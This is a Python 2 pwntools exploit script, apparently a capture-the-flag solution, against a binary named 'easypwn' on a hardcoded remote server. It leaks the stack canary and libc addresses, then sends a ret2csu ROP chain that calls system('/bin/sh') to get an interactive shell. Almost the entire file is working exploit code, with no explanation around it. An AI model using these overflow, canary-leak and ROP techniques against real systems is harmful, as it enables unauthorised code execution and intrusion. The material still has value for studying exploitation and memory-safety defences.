#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'
# context.arch('linux', 'amd64')

class Config:
    exe = './easypwn'
    elf = ELF(exe)
    offset = 0x50 + 8
    start_fun = 0x4005d0
    pop_rdi_ret = 0x004007f3  #: pop rdi ; ret  ;  (1 found)
    bss = 0x601060
    lib_csu_init0 = 0x4007EA
    lib_csu_init1 = 0x4007D0

class Local(Config):
    host = '127.0.0.1'
    port = 4444
    delta = 0xa5b40

    def __init__(self):
        self.io = remote(Local.host, Local.port)

class Remote(Config):
    host = '106.75.66.195'
    port = 20000
    delta = 0xa77b0

    def __init__(self):
        self.io = remote(Remote.host, Remote.port)


class Exploit:
    io = None
    canary = None
    delta = None

    @staticmethod
    def stage1():
        e = Exploit
        c = Config
        e.io = Local().io if len(sys.argv) == 1 else Remote().io
        e.canary, libc_read = e.leak_canary_and_read()
        
        d = DynELF(e.leak, elf=c.elf)
        libc_system = d.lookup('system', 'libc')
        log.info('libc_read = %s', hex(libc_read))
        log.success('libc_system = %s', hex(libc_system))
        
        e.delta = libc_read - libc_system
        log.success('libc_read - libc_system = %s', hex(e.delta))
        e.io.close()
        # e.io.interactive()

    @staticmethod
    def stage2():
        e = Exploit
        c = Config
        if len(sys.argv) == 1:
            cf = Local()
        else:
            cf = Remote()
        e.io = cf.io
        delta = cf.delta
        
        e.canary, libc_read = e.leak_canary_and_read()
        log.info('libc_read = %s', hex(libc_read))
        libc_system = libc_read - delta
        log.success('libc_system = %s', hex(libc_system))
        raw_input('w')

        payload = ''.join([
            'A' * (0x50 - 0x8) + e.canary + 'B' * 8,
            p64(c.lib_csu_init0),
            p64(0),  # pop rbx
            p64(1),  # pop rbp 
            p64(c.elf.got['read']),  # pop r12 
            p64(8),  # pop r13 -> rdx 
            p64(c.bss),  # pop r14 -> rsi 
            p64(0),  # pop r15 => r15d -> edi
            p64(c.lib_csu_init1),
            'whatever' * 7,
            p64(c.pop_rdi_ret),
            p64(c.bss),
            p64(libc_system)
        ])
        raw_input('w')
        e.io.sendafter('you?\n', 'whatever')
        e.io.sendafter('name?\n', payload)
        # e.io.recvuntil('again!\n')  # 这里非常诡异，网络连接的话必须注释掉。本地进程的话必须启用
        sleep(0.1)
        e.io.send('/bin/sh\x00')
        sleep(0.1)

        e.io.interactive()
        e.io.close()

    @staticmethod
    def leak_canary_and_read():
        e = Exploit
        c = Config
        payload = 'A' * (0x50 - 0x8 + 1)
        e.io.sendafter('you?\n', payload)
        e.io.recvuntil(payload)
        canary = '\x00' + e.io.recv(7)
        log.success('canary = %s', hex(u64(canary)))
        payload = 'A' * (0x50 - 0x8) + canary + 'B' * 8 \
            + p64(c.pop_rdi_ret) \
            + p64(c.elf.got['read']) \
            + p64(c.elf.symbols['puts']) \
            + p64(c.start_fun)
        # raw_input('w')
        e.io.sendafter('name?\n', payload)
        e.io.recvuntil('again!\n')
        r = e.io.recvuntil('\nHello!')
        libc_read = u64(r[:-7].ljust(8, '\x00'))
        log.success('libc_read = %s', hex(libc_read))
        return canary, libc_read

    @staticmethod
    def leak(addr):
        e = Exploit
        c = Config
        va = addr
        buf = list()
        while len(buf) < 8:
            payload = 'A' * (0x50 - 0x8) + e.canary + 'B' * 8 + p64(c.pop_rdi_ret) + p64(va) + p64(c.elf.symbols['puts']) + p64(c.start_fun)
            e.io.sendafter('you?\n', 'whatever')
            e.io.sendafter('name?\n', payload)
            e.io.recvuntil('again!\n')
            r = e.io.recvuntil('\nHello!')[:-7]
            l = len(r)
            if l > 0:
                buf.extend(r)
                va += l
            else:
                buf.append(b'\x00')
                va += 1
        return b''.join(buf[:8])
    

if __name__ == '__main__':
    Exploit.stage2()
